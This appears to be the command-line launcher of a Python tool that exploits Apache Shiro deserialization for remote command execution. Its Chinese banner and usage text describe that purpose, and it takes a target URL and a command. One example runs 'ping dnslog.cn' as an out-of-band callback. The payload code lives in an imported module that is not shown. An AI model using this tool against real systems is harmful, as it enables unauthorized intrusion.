# -*- coding: utf-8 -*-
# 
import sys
import argparse
from moule.main import scripts

banner='''
 ____  _     _             _   _   _             _    
/ ___|| |__ (_)_ __ ___   / \ | |_| |_ __ _  ___| | __
\___ \| '_ \| | '__/ _ \ / _ \| __| __/ _` |/ __| |/ /
 ___) | | | | | | | (_) / ___ \ |_| || (_| | (__|   < 
|____/|_| |_|_|_|  \___/_/   \_\__|\__\__,_|\___|_|\_\
                           By reader-l
                           基于斯文大佬的ShiroScan自己魔改的,适合自己用的.
'''


print(banner)
print('Welcome To Shiro反序列化 RCE 的利用工具 ! '+'\n')

def parser_error(errmsg):
    print("Usage: python " + sys.argv[0] + " [Options] use -h for more detail")
    print("Usage:" + "python3 shiro.py -u url")
    print("Usage:" + "python3 shiro.py -u url -c command")
    print("Usage:" + "若import模块错误，安装不成功，请到linux系统安装运行，或者去python库将crypto首字母改为大写并尝试pip install pycryptodome")
    print('Usage：python3 shiro.py  http://url.com  "ping dnslog.cn"   注意命令用""包起来')
    sys.exit()

def parse_args():
    # parse the arguments
    parser = argparse.ArgumentParser(epilog="\tExample: \r\npython3 " + sys.argv[0] + " -u target")
    parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-u', '--url', help="Target url.", default="http://127.0.0.1:8080",required=True)
    parser.add_argument('-c', '--command', help="The commands you want to do", default=None,required=False)

    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()
    print("Usage: python3 " + sys.argv[0] + " [Options] use -h for help")
    url = args.url
    print(url)
    command = args.command
    if url:
        if command:
            scripts(url,command)
        else:
            scripts(url)
    else:
        parser_error()
    
